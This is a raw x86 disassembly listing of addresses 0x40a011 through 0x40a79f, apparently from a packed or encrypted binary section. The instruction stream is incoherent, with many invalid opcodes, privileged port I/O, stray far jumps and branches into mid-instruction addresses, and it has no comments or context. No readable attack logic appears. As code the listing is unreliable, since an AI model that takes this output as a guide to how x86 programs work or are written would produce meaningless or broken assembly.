  40a011:	xor    eax,0xa32e4d4c
  40a016:	xchg   ebp,eax
  40a017:	aad    0x8c
  40a019:	jmp    0x409fc2
  40a01b:	xor    al,0x9
  40a01d:	sbb    al,BYTE PTR ds:0x7b08d88d
  40a023:	push   ebx
  40a024:	sub    eax,0xf77dc315
  40a029:	cwde   
  40a02a:	sub    al,bh
  40a02c:	jmp    0x409fb6
  40a02e:	inc    esp
  40a02f:	test   eax,0x8abc9391
  40a034:	mov    dh,0xfb
  40a036:	xchg   ecx,eax
  40a037:	jle    0x40a0b3
  40a039:	arpl   WORD PTR [edi+0x47],di
  40a03c:	nop
  40a03d:	pushf  
  40a03e:	jl     0x40a049
  40a040:	cs fwait
  40a042:	mov    al,ds:0x16a05e36
  40a047:	sbb    bh,0x10
  40a04a:	sbb    dh,BYTE PTR [ecx-0x1896492c]
  40a050:	cmp    eax,0x5bc9830f
  40a055:	adc    al,0x8a
  40a057:	dec    ecx
  40a058:	(bad)  
  40a059:	cmc    
  40a05a:	ficomp WORD PTR [ebp-0x68a94008]
  40a060:	mov    WORD PTR [edx],es
  40a062:	pop    ebx
  40a063:	sahf   
  40a064:	pop    ds
  40a065:	jg     0x40a068
  40a067:	repz adc ebx,edi
  40a06a:	and    BYTE PTR [ebx-0x2f18608b],bh
  40a070:	out    dx,al
  40a071:	nop    eax
  40a074:	mov    dl,0xe0
  40a076:	or     DWORD PTR [edi+0x414e778d],edx
  40a07c:	es pop esi
  40a07e:	lods   eax,DWORD PTR ds:[esi]
  40a07f:	jno    0x40a047
  40a081:	mov    WORD PTR [ecx+0x808a617],?
  40a087:	push   ecx
  40a088:	mov    ds:0xb3a582c0,al
  40a08d:	imul   ebx,ecx,0x9199dfa0
  40a093:	sub    BYTE PTR [esi-0x27],dh
  40a096:	dec    ecx
  40a097:	scas   eax,DWORD PTR es:[edi]
  40a098:	inc    ebp
  40a099:	jo     0x40a11a
  40a09b:	aaa    
  40a09c:	in     al,0xa8
  40a09e:	inc    edx
  40a09f:	sahf   
  40a0a0:	ret    0x4c7f
  40a0a3:	jl     0x40a0a7
  40a0a5:	(bad)  
  40a0a6:	mov    dh,0xf6
  40a0a8:	dec    edx
  40a0a9:	adc    eax,DWORD PTR [esi+0x78]
  40a0ac:	pop    ebp
  40a0ad:	and    al,0x72
  40a0af:	out    dx,eax
  40a0b0:	loop   0x40a0d3
  40a0b2:	outs   dx,BYTE PTR ds:[esi]
  40a0b3:	mov    bl,cl
  40a0b5:	add    eax,0xbdfcfbcf
  40a0ba:	adc    esp,0xffffff9c
  40a0bd:	fstp   DWORD PTR ds:0x4d519e68
  40a0c3:	test   DWORD PTR [esi+0x44efc61e],ecx
  40a0c9:	(bad)  
  40a0ca:	scas   eax,DWORD PTR es:[edi]
  40a0cb:	xor    ecx,esi
  40a0cd:	push   ds
  40a0ce:	and    edi,esi
  40a0d0:	inc    ebp
  40a0d1:	push   0x75
  40a0d3:	push   cs
  40a0d4:	rol    DWORD PTR [edi],1
  40a0d6:	in     al,0xac
  40a0d8:	mov    ebp,0xcbe0d0aa
  40a0dd:	adc    bh,BYTE PTR [esi-0x18c302df]
  40a0e3:	mov    bl,0xba
  40a0e5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a0e6:	sbb    edi,DWORD PTR [ebp-0x3e56bc82]
  40a0ec:	cs push esp
  40a0ee:	xchg   ebp,eax
  40a0ef:	push   ebp
  40a0f0:	pusha  
  40a0f1:	mov    ebp,0x3ebce62a
  40a0f6:	cmp    al,BYTE PTR [eax]
  40a0f8:	nop
  40a0f9:	outs   dx,DWORD PTR es:[esi]
  40a0fb:	xchg   edx,eax
  40a0fc:	and    eax,0x93413119
  40a101:	xchg   ebp,eax
  40a102:	int3   
  40a103:	jg     0x40a096
  40a105:	inc    edi
  40a106:	sub    al,0x1a
  40a108:	add    eax,0x7cacfec6
  40a10d:	mov    dh,0x91
  40a10f:	sbb    DWORD PTR [ecx+0x1f],eax
  40a112:	pop    es
  40a113:	push   ds
  40a114:	bound  esp,QWORD PTR [eax-0x3d]
  40a117:	pop    edi
  40a118:	je     0x40a0fd
  40a11a:	in     al,dx
  40a11b:	fist   DWORD PTR [ebp-0x262a562b]
  40a121:	scas   al,BYTE PTR es:[edi]
  40a122:	xor    al,0xa0
  40a124:	cdq    
  40a125:	or     BYTE PTR [ebp-0x58e46179],dh
  40a12b:	inc    ebx
  40a12c:	call   0xa3f47db8
  40a131:	push   ebx
  40a132:	stc    
  40a133:	(bad)  
  40a134:	pop    eax
  40a135:	or     BYTE PTR [ecx+0x66ca0a4c],bh
  40a13b:	add    BYTE PTR [ebp-0xe4edb18],dh
  40a141:	push   cs
  40a142:	adc    BYTE PTR [ebx-0x985356c],al
  40a148:	push   DWORD PTR [edi+0x56]
  40a14b:	xchg   esi,eax
  40a14c:	sub    eax,0x36e5396c
  40a151:	mov    edi,0x76f67ec9
  40a156:	enter  0x5407,0x43
  40a15a:	jnp    0x40a19a
  40a15c:	ins    BYTE PTR es:[edi],dx
  40a15d:	dec    edi
  40a15e:	call   0xe8bf1f50
  40a163:	arpl   WORD PTR [esi+ebx*8],cx
  40a166:	loopne 0x40a1a9
  40a168:	push   ds
  40a169:	fimul  WORD PTR [esi]
  40a16b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a16c:	mov    al,ds:0xf706a18
  40a171:	fcmovbe st,st(2)
  40a173:	mov    ds:0xc4809396,eax
  40a178:	(bad)  
  40a179:	jle    0x40a1e6
  40a17b:	daa    
  40a17c:	js     0x40a157
  40a17e:	frstor [esi]
  40a180:	stos   DWORD PTR es:[edi],eax
  40a181:	mov    ah,BYTE PTR ds:0xc14fa1a8
  40a187:	test   DWORD PTR [ebx],esi
  40a189:	or     al,0x35
  40a18b:	and    BYTE PTR ds:[ecx],0x6a
  40a18f:	lock shr ebx,0x12
  40a193:	push   edx
  40a194:	popa   
  40a195:	stc    
  40a196:	sbb    al,0xf
  40a198:	sub    ah,dl
  40a19a:	mov    DWORD PTR [eax-0x3f],esi
  40a19d:	cmp    eax,DWORD PTR [esi+0xec58d66]
  40a1a3:	adc    DWORD PTR [eax-0x658b5144],edx
  40a1a9:	stos   BYTE PTR es:[edi],al
  40a1aa:	ja     0x40a131
  40a1ac:	and    dl,bh
  40a1ae:	(bad)  
  40a1af:	rcr    dl,cl
  40a1b1:	mov    edi,0x5d9939aa
  40a1b6:	mov    ah,0xa3
  40a1b8:	push   ebx
  40a1b9:	mov    BYTE PTR [ecx+0xa1fd295],bl
  40a1bf:	inc    edx
  40a1c0:	pop    es
  40a1c1:	adc    BYTE PTR [ecx],bl
  40a1c3:	jno    0x40a1fa
  40a1c5:	(bad)  
  40a1c6:	clc    
  40a1c7:	in     eax,0x0
  40a1c9:	popa   
  40a1ca:	lahf   
  40a1cb:	ss or  al,0xa7
  40a1ce:	cmp    DWORD PTR [ebx+0x61],edx
  40a1d1:	ret    0x5a47
  40a1d4:	jp     0x40a208
  40a1d6:	push   0xd0431796
  40a1db:	in     eax,0x39
  40a1dd:	push   ss
  40a1de:	lahf   
  40a1df:	jge    0x40a20e
  40a1e1:	les    eax,FWORD PTR [ecx]
  40a1e3:	ret    
  40a1e4:	jge    0x40a198
  40a1e6:	call   0x77eb0735
  40a1eb:	push   cs
  40a1ec:	ins    DWORD PTR es:[edi],dx
  40a1ed:	mov    al,0x33
  40a1ef:	dec    esi
  40a1f0:	lods   al,BYTE PTR ds:[esi]
  40a1f1:	and    DWORD PTR ds:0x3719a898,0x5d
  40a1f8:	sub    eax,0x3833bebc
  40a1fd:	sub    BYTE PTR [ecx],0xbc
  40a200:	scas   eax,DWORD PTR es:[edi]
  40a201:	loope  0x40a18c
  40a203:	mov    BYTE PTR [eax],0xfb
  40a206:	inc    esp
  40a207:	and    eax,eax
  40a209:	ja     0x40a1a9
  40a20b:	mov    bh,0x88
  40a20d:	xor    eax,0x3719d34a
  40a212:	cli    
  40a213:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a214:	aam    0xc9
  40a216:	sti    
  40a217:	lods   al,BYTE PTR ds:[esi]
  40a218:	out    0x73,al
  40a21a:	jl     0x40a247
  40a21c:	adc    DWORD PTR [ebp-0x46],edx
  40a21f:	adc    al,0x40
  40a221:	push   ebp
  40a222:	inc    ebx
  40a223:	dec    ecx
  40a224:	jle    0x40a253
  40a226:	dec    ebp
  40a227:	jecxz  0x40a1ce
  40a229:	adc    BYTE PTR [eax],al
  40a22b:	pop    esp
  40a22c:	xlat   BYTE PTR ds:[ebx]
  40a22d:	or     DWORD PTR [edi+0x36fe20a5],0xb963287e
  40a237:	ss jns 0x40a1d5
  40a23a:	dec    esi
  40a23b:	lods   al,BYTE PTR ds:[esi]
  40a23c:	out    0x24,al
  40a23e:	neg    DWORD PTR [ebx+0x3b413a9]
  40a244:	test   BYTE PTR [esi-0x27],bl
  40a247:	add    bl,BYTE PTR [ecx-0x5e6f6955]
  40a24d:	gs test eax,0x5bcc411d
  40a253:	lds    edx,FWORD PTR [esi]
  40a255:	sahf   
  40a256:	adc    DWORD PTR [edi+0x72e6611e],edi
  40a25c:	xchg   esi,eax
  40a25d:	loope  0x40a1f4
  40a25f:	aaa    
  40a260:	push   esp
  40a261:	arpl   WORD PTR [esi+0x19],bp
  40a264:	pusha  
  40a265:	or     esp,DWORD PTR [esi+ebx*1+0x73]
  40a269:	cmc    
  40a26a:	dec    esp
  40a26b:	jo     0x40a25f
  40a26d:	adc    ecx,DWORD PTR [ebx+0x38805488]
  40a273:	push   ebx
  40a274:	sub    al,0x61
  40a276:	in     al,0x62
  40a278:	sub    DWORD PTR [eax+0x30c90e9f],ecx
  40a27e:	in     al,dx
  40a27f:	pop    ebp
  40a280:	push   ebp
  40a281:	dec    edx
  40a282:	cs dec ecx
  40a284:	aam    0xfe
  40a286:	mov    esi,0x574db303
  40a28b:	dec    ebp
  40a28c:	inc    ebx
  40a28d:	jmp    0xedf16d3d
  40a292:	inc    esp
  40a293:	ss retf 
  40a295:	test   eax,0x9c620d44
  40a29b:	pop    ss
  40a29c:	jns    0x40a2ec
  40a29e:	cld    
  40a29f:	shl    DWORD PTR [esi+0x28],cl
  40a2a2:	mov    cl,cl
  40a2a4:	icebp  
  40a2a5:	jmp    0xc1d5:0x3d8d5357
  40a2ac:	stos   DWORD PTR es:[edi],eax
  40a2ad:	stos   BYTE PTR es:[edi],al
  40a2ae:	mov    ch,al
  40a2b0:	dec    ebx
  40a2b1:	lock or eax,0x54666e0f
  40a2b7:	(bad)  
  40a2b8:	fiadd  WORD PTR [ecx-0x77]
  40a2bb:	lea    ecx,[eax-0x6ba1623c]
  40a2c1:	mov    esp,0x4930f2b6
  40a2c6:	rcl    DWORD PTR [ebp-0x5c],1
  40a2c9:	mov    edx,0x79d638dc
  40a2ce:	dec    ebx
  40a2cf:	push   0x7c11c717
  40a2d4:	mov    esp,0x2f42319c
  40a2d9:	outs   dx,DWORD PTR ds:[esi]
  40a2da:	pop    ebp
  40a2db:	xchg   edx,eax
  40a2dc:	add    BYTE PTR [eax-0x6ac336bd],dl
  40a2e2:	jae    0x40a352
  40a2e4:	inc    ebp
  40a2e5:	cmp    DWORD PTR [ebx-0x58],esi
  40a2e8:	inc    ebx
  40a2e9:	cdq    
  40a2ea:	xchg   DWORD PTR [ebp-0x6d],eax
  40a2ed:	adc    al,0xcc
  40a2ef:	stc    
  40a2f0:	adc    eax,0x2d4d9900
  40a2f5:	clc    
  40a2f6:	xlat   BYTE PTR ds:[ebx]
  40a2f7:	fadd   QWORD PTR ds:0x3ebe8798
  40a2fd:	pop    ecx
  40a2fe:	adc    ebx,DWORD PTR [eax+0x5d5aada2]
  40a304:	jp     0x40a28d
  40a306:	inc    esi
  40a307:	mov    BYTE PTR [eax-0xf],dh
  40a30a:	fisttp WORD PTR [ebx+0x42]
  40a30d:	mov    cl,0x4f
  40a30f:	in     eax,0xd7
  40a311:	call   0xd09475a3
  40a316:	nop
  40a317:	adc    esp,DWORD PTR [ebx]
  40a319:	lahf   
  40a31a:	inc    ebx
  40a31b:	scas   eax,DWORD PTR es:[edi]
  40a31c:	enter  0x1bba,0x3
  40a320:	lahf   
  40a321:	push   es
  40a322:	dec    eax
  40a323:	jne    0x40a368
  40a325:	aad    0x15
  40a327:	pusha  
  40a328:	popf   
  40a329:	cmp    cl,BYTE PTR [eax+0x5787fb0c]
  40a32f:	or     cl,al
  40a331:	ins    DWORD PTR es:[edi],dx
  40a332:	sahf   
  40a333:	inc    BYTE PTR [edx-0x3f]
  40a336:	retf   0x1136
  40a339:	pop    edi
  40a33a:	fmul   st(6),st
  40a33c:	or     esi,ebp
  40a33e:	fldcw  WORD PTR [ecx]
  40a340:	mov    bh,0x63
  40a342:	imul   edi,DWORD PTR [esi],0xddc5434c
  40a348:	sbb    ebx,DWORD PTR [eax+ecx*4+0x363b0f3c]
  40a34f:	cmp    DWORD PTR [ebx+0x73],0x9
  40a353:	mov    dl,0x99
  40a355:	mov    BYTE PTR [edi+0x1bb04389],bh
  40a35b:	(bad)  
  40a35c:	in     eax,0x80
  40a35e:	adc    al,0x50
  40a360:	pop    eax
  40a361:	push   eax
  40a362:	sbb    DWORD PTR [ecx],eax
  40a364:	loopne 0x40a353
  40a366:	retf   0xf208
  40a369:	xchg   edi,eax
  40a36a:	pop    esp
  40a36b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a36c:	add    edi,DWORD PTR [edi-0x59]
  40a36f:	test   BYTE PTR [ebx-0x1d],cl
  40a372:	jnp    0x40a3bb
  40a374:	add    al,0xc4
  40a376:	retf   
  40a377:	and    dh,BYTE PTR [eax+esi*2-0x46c9fe2]
  40a37e:	mov    bl,0x43
  40a380:	stos   BYTE PTR es:[edi],al
  40a381:	call   0xb40e:0xff2c10a2
  40a388:	and    eax,0xa2551e6c
  40a38d:	in     eax,dx
  40a38e:	mov    BYTE PTR [esi+0x1f683150],dh
  40a394:	repz mov bl,0x67
  40a397:	push   ds
  40a398:	mov    ah,0xd6
  40a39a:	mov    al,ds:0xaafe2d85
  40a39f:	push   ebx
  40a3a0:	fld    DWORD PTR [ecx+0x37]
  40a3a3:	adc    DWORD PTR [edi-0x5774670a],ecx
  40a3a9:	test   eax,0x1cb5087b
  40a3ae:	fmulp  st(3),st
  40a3b0:	xlat   BYTE PTR ds:[ebx]
  40a3b1:	jecxz  0x40a33b
  40a3b3:	ret    
  40a3b4:	test   al,0xe2
  40a3b6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a3b7:	std    
  40a3b8:	fstp   TBYTE PTR [ecx+0x4332452f]
  40a3be:	mov    eax,0x25a2b90b
  40a3c3:	cdq    
  40a3c4:	sub    DWORD PTR [eax-0x49],ecx
  40a3c7:	add    al,0xab
  40a3c9:	mov    eax,ds:0xb1e4132b
  40a3ce:	and    ebx,esp
  40a3d0:	jns    0x40a43a
  40a3d2:	push   ebp
  40a3d3:	mov    ch,0x80
  40a3d5:	pop    esp
  40a3d6:	jmp    0xba90:0x6046f484
  40a3dd:	jge    0x40a398
  40a3df:	push   ds
  40a3e0:	inc    eax
  40a3e1:	or     al,0xb4
  40a3e3:	push   esp
  40a3e4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a3e5:	aam    0x7e
  40a3e7:	rol    BYTE PTR [ebp-0x7f5defcd],0x9e
  40a3ee:	mov    gs,ebx
  40a3f0:	data16 sbb BYTE PTR [eax-0x69],dh
  40a3f4:	loop   0x40a3e8
  40a3f6:	cmp    DWORD PTR ds:0xa963262a,edx
  40a3fc:	scas   al,BYTE PTR es:[edi]
  40a3fd:	scas   eax,DWORD PTR es:[edi]
  40a3fe:	pop    edi
  40a3ff:	bound  ecx,QWORD PTR [esi]
  40a401:	xor    BYTE PTR ds:0x22fff3bb,dl
  40a407:	mov    eax,0xa97b91c7
  40a40c:	inc    edx
  40a40d:	cmp    bl,BYTE PTR [edi]
  40a40f:	cdq    
  40a410:	sub    al,0x78
  40a412:	mov    ecx,esp
  40a414:	inc    ebp
  40a415:	fwait
  40a416:	adc    DWORD PTR [ebp+0x16],eax
  40a419:	push   es
  40a41a:	xor    eax,0x270d0a2
  40a41f:	jnp    0x40a459
  40a421:	mov    al,ds:0xeaed648c
  40a426:	bound  esp,QWORD PTR [edx+esi*8+0x1195a073]
  40a42d:	rcr    DWORD PTR [ebp-0x218fc595],cl
  40a433:	adc    al,0x8d
  40a435:	jge    0x40a48e
  40a437:	cmc    
  40a438:	retf   
  40a439:	fs out 0xeb,al
  40a43c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a43d:	jne    0x40a408
  40a43f:	push   ecx
  40a440:	shl    DWORD PTR ds:0x8fd7fc00,cl
  40a446:	jle    0x40a47c
  40a448:	into   
  40a449:	cmp    al,0x88
  40a44b:	xchg   edi,eax
  40a44c:	mov    bh,0x94
  40a44e:	leave  
  40a44f:	inc    eax
  40a450:	sbb    cl,dh
  40a452:	sub    cl,BYTE PTR [esi+ecx*2-0x2164ebfb]
  40a459:	dec    ecx
  40a45a:	test   DWORD PTR [ecx],eax
  40a45c:	aad    0x2b
  40a45e:	adc    DWORD PTR [eax+edi*4+0x6f],ebp
  40a462:	pop    ss
  40a463:	inc    ebx
  40a464:	int    0x2b
  40a466:	xor    bh,ah
  40a468:	push   esi
  40a469:	cdq    
  40a46a:	imul   esp,DWORD PTR [esi],0x6b
  40a46d:	lds    edx,FWORD PTR [ebp+0x4986c402]
  40a473:	mov    al,0x48
  40a475:	fstp   QWORD PTR [edi]
  40a477:	imul   ebp,DWORD PTR [edi+ebp*4+0x3ac65c37],0x2add049b
  40a482:	xchg   ecx,eax
  40a483:	mul    BYTE PTR [ebp+edx*4+0x11]
  40a487:	stc    
  40a488:	mov    WORD PTR [ebp+0x555c324b],ss
  40a48e:	mov    edi,0x71465b8a
  40a493:	hlt    
  40a494:	xor    eax,0x6eb039da
  40a499:	or     eax,0x6f8b2466
  40a49e:	(bad)  
  40a49f:	and    DWORD PTR [ebx],edx
  40a4a1:	cmp    al,0x5a
  40a4a3:	aad    0xf6
  40a4a5:	adc    BYTE PTR [ecx],dh
  40a4a7:	int3   
  40a4a8:	push   eax
  40a4a9:	or     DWORD PTR [ebx+esi*1-0x1132e651],0xffffffbb
  40a4b1:	xor    DWORD PTR [edi+edi*1-0x46d2d3e3],0x4b656aab
  40a4bc:	and    dh,BYTE PTR [esi]
  40a4be:	test   al,0x37
  40a4c0:	xor    eax,0x988caa3
  40a4c5:	das    
  40a4c6:	jo     0x40a46e
  40a4c8:	cmp    edi,DWORD PTR [ecx]
  40a4ca:	enter  0x50ad,0x39
  40a4ce:	stos   BYTE PTR es:[edi],al
  40a4cf:	(bad)  
  40a4d0:	fimul  WORD PTR [ebx]
  40a4d2:	xchg   ecx,eax
  40a4d3:	mov    ecx,0xa4fc5334
  40a4d8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a4d9:	xchg   ebx,edi
  40a4db:	ss in  al,0xf3
  40a4de:	cli    
  40a4df:	mov    ecx,0x3aa4be7b
  40a4e4:	inc    ebp
  40a4e5:	sbb    eax,0xc10c2799
  40a4ea:	ret    0x8977
  40a4ed:	les    esp,FWORD PTR [eax-0x13]
  40a4f0:	out    0x5b,al
  40a4f2:	call   0x127b:0x9f325def
  40a4f9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a4fa:	mov    esi,0x3b175cdc
  40a4ff:	loopne 0x40a57b
  40a501:	int3   
  40a502:	or     al,0x90
  40a504:	pop    edx
  40a505:	sbb    al,0x9b
  40a507:	add    BYTE PTR fs:[edi+0x6077eb33],cl
  40a50e:	push   esp
  40a50f:	xchg   esp,eax
  40a510:	fimul  WORD PTR ds:0xa86f3e3
  40a516:	es mov esp,0x6d8b338
  40a51c:	scas   al,BYTE PTR es:[edi]
  40a51d:	push   0x63f728c7
  40a522:	push   eax
  40a523:	sbb    eax,0x9cd8e740
  40a528:	aad    0x72
  40a52a:	add    al,0x54
  40a52c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a52d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a52e:	push   es
  40a52f:	(bad)  
  40a530:	xchg   edi,eax
  40a531:	aaa    
  40a532:	pushf  
  40a533:	mov    eax,ds:0x4f8439ef
  40a538:	fsubr  QWORD PTR [ebx-0x5a]
  40a53b:	jp     0x40a4e7
  40a53d:	adc    DWORD PTR [edi-0x7bd6039b],edx
  40a543:	pushf  
  40a544:	leave  
  40a545:	jmp    0xf0bee0b4
  40a54a:	nop
  40a54b:	jle    0x40a54b
  40a54d:	loop   0x40a503
  40a54f:	ficomp DWORD PTR ds:0x8c0972de
  40a555:	test   al,0xea
  40a557:	lods   eax,DWORD PTR ds:[esi]
  40a558:	icebp  
  40a559:	pop    ss
  40a55a:	mov    al,BYTE PTR [edx]
  40a55c:	imul   esi,DWORD PTR [edx+0x10],0xffffff9f
  40a560:	mov    ah,0x31
  40a562:	test   BYTE PTR [esi+eiz*8-0x28eaa4cc],ah
  40a569:	add    esp,DWORD PTR [edx+0x16]
  40a56c:	outs   dx,DWORD PTR ds:[esi]
  40a56d:	addr16 mov ch,0x5e
  40a570:	pop    ebx
  40a571:	fdiv   QWORD PTR [esi+ebx*1-0x727c70ec]
  40a578:	stos   BYTE PTR es:[edi],al
  40a579:	pop    eax
  40a57a:	cmp    bl,BYTE PTR [edx]
  40a57c:	je     0x40a54c
  40a57e:	mov    esp,0x2f632697
  40a583:	(bad)  
  40a585:	mov    esi,ebp
  40a587:	xor    al,0x2e
  40a589:	push   esi
  40a58a:	retf   0xc8e7
  40a58d:	imul   esp,DWORD PTR [ebp-0x417689e8],0xb2a152aa
  40a597:	push   cs
  40a598:	jo     0x40a605
  40a59a:	in     al,0xc7
  40a59c:	fisttp WORD PTR [edx-0x7]
  40a59f:	sub    BYTE PTR [ebx+0x6501c577],0x1
  40a5a6:	push   0x14e6da51
  40a5ab:	ja     0x40a5f9
  40a5ad:	test   BYTE PTR [ecx*4+0x7e09d9f3],dl
  40a5b4:	outs   dx,BYTE PTR ds:[esi]
  40a5b5:	fucomip st,st(2)
  40a5b7:	(bad)  
  40a5b8:	(bad)  
  40a5b9:	js     0x40a554
  40a5bb:	inc    ebp
  40a5bc:	in     eax,0x48
  40a5be:	fsub   DWORD PTR [eax+0x3810a336]
  40a5c4:	push   0x817536fc
  40a5c9:	popf   
  40a5ca:	mov    ecx,0x4729f967
  40a5cf:	jo     0x40a5ed
  40a5d1:	jmp    0x40a627
  40a5d3:	pop    edi
  40a5d4:	(bad)  
  40a5d6:	dec    edx
  40a5d7:	pop    esp
  40a5d8:	fimul  DWORD PTR [ebp-0x28]
  40a5db:	aad    0xa8
  40a5dd:	cld    
  40a5de:	and    esp,edx
  40a5e0:	push   edi
  40a5e1:	add    eax,DWORD PTR [esi+0x27f39471]
  40a5e7:	test   al,0x17
  40a5e9:	push   ebp
  40a5ea:	je     0x40a5a5
  40a5ec:	dec    edi
  40a5ed:	cmp    eax,edx
  40a5ef:	fisttp WORD PTR [esi+ebx*4-0x3b]
  40a5f3:	jmp    0x40a5e3
  40a5f5:	mov    al,0x29
  40a5f7:	sbb    esp,esp
  40a5f9:	pop    ebp
  40a5fa:	pop    ss
  40a5fb:	ins    DWORD PTR es:[edi],dx
  40a5fc:	repz int 0xc4
  40a5ff:	pop    ebp
  40a600:	cmp    BYTE PTR [edx-0x76],ch
  40a603:	add    DWORD PTR [eax+0x4a],esi
  40a606:	loope  0x40a5f7
  40a608:	mov    al,0xfd
  40a60a:	xchg   BYTE PTR [eax+ecx*8-0x516119cb],ah
  40a611:	or     ah,0xd6
  40a614:	rcr    DWORD PTR [ebp+0x19],1
  40a617:	jo     0x40a678
  40a619:	push   ds
  40a61a:	xor    al,0x41
  40a61c:	repz mov WORD PTR [ecx],es
  40a61f:	clc    
  40a620:	outs   dx,BYTE PTR ds:[esi]
  40a621:	dec    ecx
  40a622:	loopne 0x40a66c
  40a624:	or     edx,DWORD PTR [esi+edi*8-0x5382f590]
  40a62b:	push   edi
  40a62c:	retf   
  40a62d:	lea    edi,[ebp+0x2a]
  40a630:	lea    ebp,[eax+ecx*4+0x36]
  40a634:	jle    0x40a666
  40a636:	fidiv  WORD PTR [edx+0x31]
  40a639:	mov    al,0xb8
  40a63b:	loopne 0x40a5c2
  40a63d:	in     al,dx
  40a63e:	test   DWORD PTR [edi],0xf8381fef
  40a644:	hlt    
  40a645:	and    eax,0xa540db21
  40a64a:	dec    ecx
  40a64b:	(bad)  
  40a64c:	ins    DWORD PTR es:[edi],dx
  40a64d:	push   ds
  40a64e:	lods   al,BYTE PTR ds:[esi]
  40a64f:	xchg   edx,eax
  40a650:	xchg   al,al
  40a652:	or     al,0x83
  40a654:	pop    ecx
  40a655:	xor    eax,0xc03d70d9
  40a65a:	mov    eax,ds:0xb0a2ec3f
  40a65f:	dec    ebx
  40a660:	mov    ebx,0xf3c86948
  40a665:	cld    
  40a666:	jmp    0x8e41:0x84625d4
  40a66d:	pop    eax
  40a66e:	les    edx,FWORD PTR [edx+0x49]
  40a671:	push   esp
  40a672:	ja     0x40a646
  40a674:	jle    0x40a5fc
  40a676:	push   ecx
  40a677:	call   0x853b:0x4214f80
  40a67e:	lea    esp,[edi]
  40a680:	push   ebx
  40a681:	mov    dl,0x40
  40a683:	xor    BYTE PTR [eax-0x546edd8b],bl
  40a689:	mov    edi,0xe321243a
  40a68e:	add    eax,0xe1a3de3e
  40a693:	mov    dl,0x70
  40a695:	xor    al,0xe8
  40a697:	adc    al,0x6c
  40a699:	imul   ecx,esi,0x842d30ed
  40a69f:	mov    DWORD PTR [esi+eiz*1],ebp
  40a6a2:	sub    edi,DWORD PTR [ebx+0x2ff73c92]
  40a6a8:	ret    0xd186
  40a6ab:	cmp    dh,BYTE PTR [eax]
  40a6ad:	loop   0x40a632
  40a6af:	je     0x40a69a
  40a6b1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a6b2:	test   BYTE PTR [esi+0x76d44035],ch
  40a6b8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a6b9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a6ba:	bound  esi,QWORD PTR [edi+edx*2+0x67]
  40a6be:	in     al,0x5c
  40a6c0:	fstp   QWORD PTR [esi]
  40a6c2:	popa   
  40a6c3:	xchg   BYTE PTR [edx+0x6a],ah
  40a6c6:	in     al,dx
  40a6c7:	out    dx,eax
  40a6c8:	push   edi
  40a6c9:	fldenv [ecx-0xbe80c49]
  40a6cf:	popa   
  40a6d0:	pusha  
  40a6d1:	call   FWORD PTR [eax]
  40a6d3:	sbb    eax,0x454f7d5a
  40a6d8:	and    eax,0x92f361f8
  40a6dd:	out    dx,al
  40a6de:	mov    ds:0x8defe59a,eax
  40a6e3:	or     ebx,DWORD PTR [esi+0x23]
  40a6e6:	mov    ds:0x9a0c2a57,al
  40a6eb:	outs   dx,DWORD PTR ds:[esi]
  40a6ec:	div    DWORD PTR [ecx]
  40a6ee:	mov    esp,0x4731800a
  40a6f3:	mov    eax,ds:0xc030f6ee
  40a6f8:	fisttp WORD PTR [ebx]
  40a6fa:	xchg   esi,eax
  40a6fb:	dec    edi
  40a6fc:	clc    
  40a6fd:	stc    
  40a6fe:	out    0x98,eax
  40a700:	add    al,0xb7
  40a702:	sti    
  40a703:	cmp    DWORD PTR [eax+0x2b9c238f],ebx
  40a709:	push   ebx
  40a70a:	jns    0x40a778
  40a70c:	sbb    eax,0x9e78d182
  40a711:	jmp    0xcaad7b4d
  40a716:	push   cs
  40a717:	xchg   esi,eax
  40a718:	xchg   ecx,eax
  40a719:	(bad)  
  40a71b:	cmp    DWORD PTR [esi-0x10],edi
  40a71e:	cmc    
  40a71f:	call   0x33e4:0xc7a0372a
  40a726:	or     eax,0x15f01487
  40a72b:	aad    0x34
  40a72d:	gs dec eax
  40a72f:	pop    ebx
  40a730:	or     BYTE PTR [ecx-0x6],bl
  40a733:	loop   0x40a7a1
  40a735:	fwait
  40a736:	adc    DWORD PTR [esi],0xffffffde
  40a739:	add    eax,0x8a1a7c20
  40a73e:	call   0xdd98:0x71165260
  40a745:	jbe    0x40a6d8
  40a747:	mov    al,0x32
  40a749:	cmps   BYTE PTR fs:[esi],BYTE PTR es:[edi]
  40a74b:	jae    0x40a7cb
  40a74d:	jbe    0x40a7c4
  40a74f:	daa    
  40a750:	pop    edx
  40a751:	and    ch,BYTE PTR [esi+esi*2-0x79]
  40a755:	mov    ebx,esp
  40a757:	in     eax,dx
  40a758:	sbb    BYTE PTR [ebp+0x51],al
  40a75b:	ins    BYTE PTR es:[edi],dx
  40a75c:	aas    
  40a75d:	les    edx,FWORD PTR [ebx-0x525ae8fc]
  40a763:	push   ebx
  40a764:	cmc    
  40a765:	xor    DWORD PTR ds:0xd83cc2ca,ebp
  40a76b:	or     DWORD PTR ds:0xe64ad87d,esp
  40a771:	jle    0x40a73e
  40a773:	sub    al,0xdc
  40a775:	sbb    al,0x7f
  40a777:	or     al,cl
  40a779:	sbb    al,0xa4
  40a77b:	lahf   
  40a77c:	adc    al,0xc
  40a77e:	mov    esi,ecx
  40a780:	add    esp,DWORD PTR [edi+0x7f]
  40a783:	mov    edi,esi
  40a785:	push   ebx
  40a786:	sbb    al,cl
  40a788:	adc    BYTE PTR [ecx-0x1b47ed22],cl
  40a78e:	mov    edx,DWORD PTR [edi+0x56698340]
  40a794:	(bad)  
  40a795:	popf   
  40a796:	aas    
  40a797:	test   DWORD PTR [ebx+0x242bc52e],edx
  40a79d:	(bad)  
  40a79e:	cmc    
  40a79f:	dec    eax
